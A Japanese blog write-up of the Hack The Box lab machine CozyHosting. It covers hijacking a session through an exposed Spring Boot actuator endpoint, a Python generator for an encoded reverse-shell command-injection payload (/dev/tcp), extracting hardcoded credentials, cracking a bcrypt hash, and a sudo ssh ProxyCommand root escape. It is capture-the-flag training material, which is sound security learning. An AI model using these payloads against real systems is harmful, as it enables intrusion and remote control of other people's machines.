---
date: "2024-01-05"
posted: "2024-04-07"
title: "HTB CozyHosting Write-up"
tags: ["Hack The Box", "SpringBoot", "Spring Actuators"]
---


# HTB CozyHosting Write-up

## 1. nmap

次の`nmap`コマンドの結果は以下。

```
$ sudo nmap -A -p- -T4 -sV -sC -oN nmap_ipaddr.txt 10.10.11.233
```

![](./img/CozyHosting17.png)

画像の結果から、稼働しているのはSSHとHTTPのみと言うことがわかる。

---

## 2. Spring ActuatorsへのAuthentication Bypass

### 2.1 gobustersによるディレクトリ列挙

1項の結果からWebサイトにアクセスると、ログイン画面があることがわかる。

![](./img/CozyHosting03.png)

![](./img/CozyHosting04.png)

ログイン画面をBrute forceや辞書型攻撃、SQL Injectionで認証回避できる可能性もあるが、ひとまず情報収集を行う。

### 2.2 SpringBootを利用したWebサービスへのディレクトリ列挙

次に、gobusterでディレクトリ列挙を行なった。その際、[SecLists/Discovery/Web-Content/spring-boot.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt)を利用してディレクトリ列挙を行なった。

```
$ gobuster dir -w ~/Workspace/tools/SecLists/Discovery/Web-Content/spring-boot.txt -o gobuster_dir_cozyhosting.htb_rt_seclist_springboot_result.txt -u http://cozyhosting.htb
```

その結果が以下。

![](./img/CozyHosting02.png)

`/acutuator/*`というディレクトリがあることが分かった。

### 2.3 Spring ActuatorsへのAuthenticaton Bypass

#### (1) /actuator/sessions からのセッションID入手

`/actuator/*`というディレクトリについて検索すると、Spring Bootで使用していること、そして[HackTricks - Spring Actuators](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators)に攻撃のアプローチ方法が記載されていることがわかる。

![](./img/CozyHosting05.png)

このサイトを見ていくと、`/actuators/sessions`からセッションIDを入手できることが分かった。
実際に`/actuator/sessions`にアクセスすると`kanderson`ユーザのセッションIDを入手できた。

![](./img/CozyHosting06.png)

#### (2) セッションIDをSpoofingしてのログイン

先のログイン画面からログインする際に、`Cookie: JSESSIONID=...`という形でセッションIDを埋め込んでいるのがわかる。

![](./img/CozyHosting09.png)

そこで、この`JSESSIONID`をspoofingするようにBurpを設定していく。

まずは、Scopeをcozyhosting.htbに設定する。

![](./img/CozyHosting10.png)

次に、Match and replace rulesで、画面のように設定し、自動的に`JSESSIONID`が`/actuators/sessions`の`kanderson`の値になるように設定する。

![](./img/CozyHosting11.png)

以上を設定すると http://cozyhosting.htb/admin にアクセスできる。

---

## 3. Web ApplicationへのOS Command Injection

`http://cozyhosting.htb/admin`にアクセスすると図のように指定したホストの`.ssh/authorzed_keys`をincludeするためのフォームがある。

![](./img/CozyHosting12.png)

[HackTricks - Spring Actuators](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators)の"SSRF on Spring Boot Through Incorrect Pathname Interpretation"に記載の通り、Springフレームワークは複数のパラメータを`;`により分割できると書いてある。
そこで、Usernameに`;`を加えてシェルコードを挿入する。
また、半角スペースを入れることはできないため、`${IFS%??}`で組み立てる。
以上を整理してシェルコードを生成するスクリプトを作成した。

```python
import base64
import argparse
import urllib.parse

parser = argparse.ArgumentParser(description="Generate shellcode script")
parser.add_argument("--lhost", type=str, requried=True, help="Local host's ip address")
parser.add_argument("--lport", type=str, required=True, help="Local port for reverse shell")

args = parser.parse_args()
lhost = args.lhost
lport = args.lport

shell_string = f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1\n"
print("Original shell code >> ")
print('    ', shell_sring)

b64_shell = base64.encode(shell_string.encode('ascii')).decode('ascii')
print("Base64 encoded shell code >> ")
print('    ', b64_shell)

exploit = f";echo {b64_shell} | base64 -d | bash;"
print("Exploit >> ")
print('    ', exploit)

exploit = exploit.replace(" ", "${IFS%??}")
print("Replace ' ' to '${IFS%??}' >> ")
print('    ', exploit)

exploit_urlenc = urllib.parse.quote(exploit)
print("Url encoded exploit >>")
print('    ', exploit_urlenc)

print("Output:")
print(exploit_urlenc)
```

この実行結果が以下となる。

![](./img/CozyHosting18.png)


このスクリプトの実行結果のOutputを利用してUsernameをBurpで書き換える。

![](./img/CozyHosting19.png)
![](./img/CozyHosting20.png)
![](./img/CozyHosting21.png)

するとリバースシェルが確立されて、OS Command Injectionに成功する。

![](./img/CozyHosting22.png)

---

## 4. Web ApplicationとDatabaseの解析

3の結果から、シェルは獲得できたが同時に`app`ユーザしか持っていない。
そのため、ここから他のユーザへの権限昇格を行なっていく。

### 4.1 Web Applicationの解析

`app`ディレクトリにWeb Applicationのjarファイルが保存されている。
そのため、これをダウンロードして解析していく。

まずは、`nc`コマンドでダウンロードを実施。

![](./img/CozyHosting23.png)

![](./img/CozyHosting24.png)

その後、`jd-gui cloudhosting-0.0.1.jar`で開く。
すると、二つのCredentialが見つかった。
一つは、`FakeUser.class`にHard codingされているユーザ名`kanderson`、パスワード`MRdEQuv6-6P9`の組。
もう一つは`application.properties`に設定されているPostgreSQL用のユーザ名`postgres`、パスワード`Vg&nvzAZ7XxR`の組。

#### 補足：jd-guiを使わない方法
今回のようにHard codingされた文字列を探すだけなら`unzip -d cloudhosting-0.0.1.jar`で解答して、それぞれのファイルを`cat`や`strings`コマンドすることでも入手可能である。

![](./img/CozyHosting28.png)

![](./img/CozyHosting26.png)

### 4.2 PostgreSQLへのアクセスとパスワード解析

4.1で入手した`postgres`ユーザとそのパスワードを利用してPostgreSQLサーバーにアクセスする。

![](./img/CozyHosting30.png)

`\l`コマンドでデータベース一覧を確認すると`cozyhosting`というデータベースが見つかるため、`\c`コマンドで切り替える。

![](./img/CozyHosting31.png)

![](./img/CozyHosting32.png)

`\dt`コマンドでテーブル一覧を確認すると、`users`テーブルが見つかる。この中にユーザ名/パスワードが格納されていそうなので、`SELECT * FROM users`で中身を見てみる。

![](./img/CozyHosting33.png)

![](./img/CozyHosting34.png)

`admin`ユーザのパスワードハッシュをローカルに`hash_admin`保存して、`hashcat`で解析する。`$2a$10`で始まるハッシュはbcryptのため`-m 3200`を指定して解析する。（ハッシュの形式とモードは[hashcatのwiki(Example hashse)を参照](https://hashcat.net/wiki/doku.php?id=example_hashes)
辞書ファイルには`rockyou.txt`を指定した。

![](./img/CozyHosting36.png)

すると、`manchesterunited`というパスワードが見つかった。

![](./img/CozyHosting37.png)

これを事前に`app`ユーザでログインしているときに見つけていた`josh`ユーザのSSHログイン用のパスワードに使用するとログインに成功した。

![](./img/CozyHosting38.png)

---

## 5. sudo sshを利用したPrivilege Escalation

ログインして最初に`sudo -l`でパスワードなし`sudo`が可能なパスワードを確認すると`/usr/bin/ssh *`がパスワードなしでrootとして実行できることが分かった。

![](./img/CozyHosting39.png)

パスワードなし`sudo`可能な文字列に`*`が入っていることから利用できる可能性が高そうである。
そこで、検索すると、権限昇格のために`sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`が使えることが使えそうだということが[Github - RoqueNight/Linux-Privilege-Escalation-Basics](https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics)で分かった。

![](./img/CozyHosting40.png)

実際に実行すると以下のようにrootシェルを獲得できた。

![](./img/CozyHosting41.png)

---

## 6. まとめ

HTB CozyHostingで用いたテクニックや知識を整理以下のように整理した。
- User
  - Web Exploitation
    - gobusterによるAPIのエンドポイント探索
    - Spring Actuatorsの/actuators/sessionからのセッションID漏洩とSession Spoofing
    - OS Command Injection時の`${IFS%??}`による半角スペースの除去
    - Web Application用テーブルからのパスワードハッシュ入手
  - Java Applicationの解析
    - `jd-gui`によるjarファイルのデコンパイル
    - Hard codingされたcredential情報の取得
  - Password Hashの解析
- Root
  - Misconfiguration
    - `sudo ssh *`を利用したroot権限取得